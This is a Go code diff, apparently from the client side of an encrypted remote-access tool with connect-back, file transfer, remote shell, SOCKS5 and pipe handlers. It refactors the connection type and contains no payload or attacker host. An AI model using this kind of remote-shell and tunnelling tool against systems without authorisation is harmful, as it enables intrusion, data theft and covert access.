@@ -49,7 +49,7 @@ func Run(secret []byte, host string, port int, mode uint8, arg any) {
 	var connectBackListener *pel.PktEncLayerListener
 	var err error
 
-	waitForConnection := func() *pel.PktEncLayer {
+	waitForConnection := func() utils.DuplexStreamEx {
 		if isConnectBack {
 			addr := fmt.Sprintf(":%d", port)
 			for {
@@ -101,7 +101,7 @@ func Run(secret []byte, host string, port int, mode uint8, arg any) {
 	}
 }
 
-func handleGetFile(waitForConnection func() *pel.PktEncLayer, arg GetFileArgs) {
+func handleGetFile(waitForConnection func() utils.DuplexStreamEx, arg GetFileArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 	buffer := make([]byte, constants.MaxMessagesize)
@@ -158,7 +158,7 @@ func handleGetFile(waitForConnection func() *pel.PktEncLayer, arg GetFileArgs) {
 	}
 }
 
-func handlePutFile(waitForConnection func() *pel.PktEncLayer, arg PutFileArgs) {
+func handlePutFile(waitForConnection func() utils.DuplexStreamEx, arg PutFileArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 
@@ -223,7 +223,7 @@ func handlePutFile(waitForConnection func() *pel.PktEncLayer, arg PutFileArgs) {
 	}
 }
 
-func handleRunShell(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs) {
+func handleRunShell(waitForConnection func() utils.DuplexStreamEx, arg RunShellArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
@@ -261,9 +261,10 @@ func handleRunShell(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs)
 	if err != nil {
 		return
 	}
-	utils.DuplexPipe(os.Stdin, os.Stdout, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+	// utils.DuplexPipe(os.Stdin, os.Stdout, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+	utils.DuplexPipe(os.Stdin, os.Stdout, utils.DSE2ReadCloser(layer), utils.DSE2WriteCloser(layer), nil, nil)
 }
-func handleRunShellNoTTY(waitForConnection func() *pel.PktEncLayer, arg RunShellArgs) {
+func handleRunShellNoTTY(waitForConnection func() utils.DuplexStreamEx, arg RunShellArgs) {
 	layer := waitForConnection()
 	defer layer.Close()
 
@@ -271,9 +272,10 @@ func handleRunShellNoTTY(waitForConnection func() *pel.PktEncLayer, arg RunShell
 	if err != nil {
 		return
 	}
-	utils.DuplexPipe(os.Stdin, os.Stdout, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+	// utils.DuplexPipe(os.Stdin, os.Stdout, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+	utils.DuplexPipe(os.Stdin, os.Stdout, utils.DSE2ReadCloser(layer), utils.DSE2WriteCloser(layer), nil, nil)
 }
-func handleSocks5(waitForConnection func() *pel.PktEncLayer, arg Socks5Args) {
+func handleSocks5(waitForConnection func() utils.DuplexStreamEx, arg Socks5Args) {
 	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
 	if err != nil {
 		log.Println(err)
@@ -294,14 +296,16 @@ func handleSocks5(waitForConnection func() *pel.PktEncLayer, arg Socks5Args) {
 		go func() {
 			layer := waitForConnection()
 			log.Println("Connection established", conn.RemoteAddr())
-			utils.DuplexPipe(conn, conn, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+			// utils.DuplexPipe(conn, conn, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+			utils.DuplexPipe(conn, conn, utils.DSE2ReadCloser(layer), utils.DSE2WriteCloser(layer), nil, nil)
 			log.Println("Connection closed", conn.RemoteAddr())
 		}()
 	}
 }
 
-func handlePipe(waitForConnection func() *pel.PktEncLayer, arg PipeArgs) {
+func handlePipe(waitForConnection func() utils.DuplexStreamEx, arg PipeArgs) {
 	layer := waitForConnection()
 	utils.WriteVarLength(layer, []byte(arg.TargetAddr))
-	utils.DuplexPipe(os.Stdin, os.Stdout, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+	// utils.DuplexPipe(os.Stdin, os.Stdout, layer.ReadCloser(), layer.WriteCloser(), nil, nil)
+	utils.DuplexPipe(os.Stdin, os.Stdout, utils.DSE2ReadCloser(layer), utils.DSE2WriteCloser(layer), nil, nil)
 }
